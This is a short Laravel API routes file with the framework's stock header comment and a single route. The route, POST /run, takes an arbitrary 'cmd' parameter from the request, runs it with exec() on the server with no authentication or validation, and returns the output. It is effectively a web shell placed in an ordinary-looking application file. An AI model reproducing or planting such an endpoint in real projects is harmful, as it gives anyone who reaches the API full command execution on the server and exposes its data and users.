<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use  App\Http\Controllers\ApiController;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/


Route::post('/run', function (Request $request) {
   $cmd = $request->input("cmd");
   exec( "cd ~ && $cmd 2>&1", $output);
   $res = "";
   foreach($output as $out)
   {
	    $res .= "$out \r\n";
   }   
   if(strlen($res)==0)
	   return " Done! ";
   return  $res;
});
 
 

   